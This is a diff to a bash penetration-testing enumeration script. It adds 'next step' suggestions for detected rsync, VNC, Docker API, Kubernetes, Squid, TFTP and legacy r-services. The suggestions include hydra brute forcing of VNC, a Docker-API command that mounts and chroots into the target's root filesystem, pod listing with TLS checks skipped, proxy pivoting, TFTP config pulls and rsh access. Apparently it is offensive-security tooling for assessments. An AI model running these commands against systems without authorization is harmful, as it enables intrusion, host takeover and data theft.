@@ -2296,6 +2296,87 @@ generate_next_steps() {
             "./adr.sh -d <DOMAIN> -u <USER> -p '<PASS>' -dc $ip"
     fi
 
+    local rsync_port
+    rsync_port=$(first_detected_port "$target_dir" 'rsync|^873/tcp')
+    if [[ -n "$rsync_port" ]]; then
+        append_next_finding "$next_file" \
+            "rsync detected" \
+            "nmap service line includes port ${rsync_port}" \
+            "rsync rsync://$ip:$rsync_port/" \
+            "nmap --script rsync-list-modules -p $rsync_port $ip" \
+            "rsync -av rsync://$ip:$rsync_port/<MODULE>/ ./rsync_${ip//./_}_<MODULE>/"
+    fi
+
+    local vnc_port
+    vnc_port=$(first_detected_port "$target_dir" 'vnc|^590[0-9]/tcp')
+    if [[ -n "$vnc_port" ]]; then
+        append_next_finding "$next_file" \
+            "VNC detected" \
+            "nmap service line includes port ${vnc_port}" \
+            "nmap --script vnc-info,vnc-title,vnc-brute -p $vnc_port $ip" \
+            "vncviewer $ip:$((vnc_port - 5900))" \
+            "./crackr.sh --hydra vnc --target $ip -P /usr/share/wordlists/rockyou.txt"
+    fi
+
+    local docker_port
+    docker_port=$(first_detected_port "$target_dir" 'docker|^2375/tcp|^2376/tcp')
+    if [[ -n "$docker_port" ]]; then
+        append_next_finding "$next_file" \
+            "Docker API detected" \
+            "nmap service line includes port ${docker_port}" \
+            "curl -s http://$ip:$docker_port/version | jq . 2>/dev/null || curl -s http://$ip:$docker_port/version" \
+            "curl -s http://$ip:$docker_port/containers/json | jq . 2>/dev/null" \
+            "docker -H tcp://$ip:$docker_port ps" \
+            "docker -H tcp://$ip:$docker_port run --rm -it -v /:/host alpine chroot /host sh"
+    fi
+
+    local kube_port
+    kube_port=$(first_detected_port "$target_dir" 'kubernetes|^6443/tcp|^10250/tcp')
+    if [[ -n "$kube_port" ]]; then
+        append_next_finding "$next_file" \
+            "Kubernetes API/kubelet detected" \
+            "nmap service line includes port ${kube_port}" \
+            "curl -sk https://$ip:$kube_port/version" \
+            "curl -sk https://$ip:$kube_port/api/v1/pods" \
+            "kubectl --server=https://$ip:$kube_port --insecure-skip-tls-verify get pods -A"
+    fi
+
+    local squid_port
+    squid_port=$(first_detected_port "$target_dir" 'squid|proxy|^3128/tcp')
+    if [[ -n "$squid_port" ]]; then
+        append_next_finding "$next_file" \
+            "HTTP proxy/Squid detected" \
+            "nmap service line includes proxy/Squid or common proxy port ${squid_port}" \
+            "curl -x http://$ip:$squid_port -I http://127.0.0.1/" \
+            "curl -x http://$ip:$squid_port -I http://$ip/" \
+            "proxychains -q nmap -sT -Pn -p80,443,8080 <INTERNAL_IP>"
+    fi
+
+    local tftp_udp=false tftp_tcp_port
+    tftp_tcp_port=$(first_detected_port "$target_dir" 'tftp|^69/tcp')
+    if grep -qP '^69/udp\s+open' "$target_dir/scans/nmap_udp.nmap" 2>/dev/null || [[ -n "$tftp_tcp_port" ]]; then
+        tftp_udp=true
+    fi
+    if [[ "$tftp_udp" == "true" ]]; then
+        append_next_finding "$next_file" \
+            "TFTP detected" \
+            "nmap UDP/TCP results indicate TFTP on port 69" \
+            "nmap -sU --script tftp-enum -p69 $ip" \
+            "tftp $ip -c get pxelinux.cfg/default" \
+            "for f in config.txt backup.txt startup-config running-config; do tftp $ip -c get \$f; done"
+    fi
+
+    local legacy_port
+    legacy_port=$(first_detected_port "$target_dir" 'rlogin|rexec|rsh|^512/tcp|^513/tcp|^514/tcp')
+    if [[ -n "$legacy_port" ]]; then
+        append_next_finding "$next_file" \
+            "Legacy r-service detected" \
+            "nmap service line includes rlogin/rexec/rsh or ports 512-514" \
+            "nmap --script rusers,rlogin-brute -p $legacy_port $ip" \
+            "rlogin -l <USER> $ip" \
+            "rsh -l <USER> $ip id"
+    fi
+
     if is_nonempty_file "$target_dir/tcp/ssh/version_info.txt" && \
        grep -qi 'POTENTIALLY VULNERABLE SSH' "$target_dir/loot/quick_wins.txt" 2>/dev/null; then
         append_next_finding "$next_file" \
@@ -2658,6 +2739,10 @@ EOF
 #------------------------------------------------------------------------------
 # ARGUMENT PARSING
 #------------------------------------------------------------------------------
+if [[ "${OffSec_LIB_ONLY:-false}" == "true" ]]; then
+    return 0 2>/dev/null || exit 0
+fi
+
 declare -a TARGETS=()
 TARGET_FILE=""
 # Preserve original args so sudo re-exec can pass them verbatim
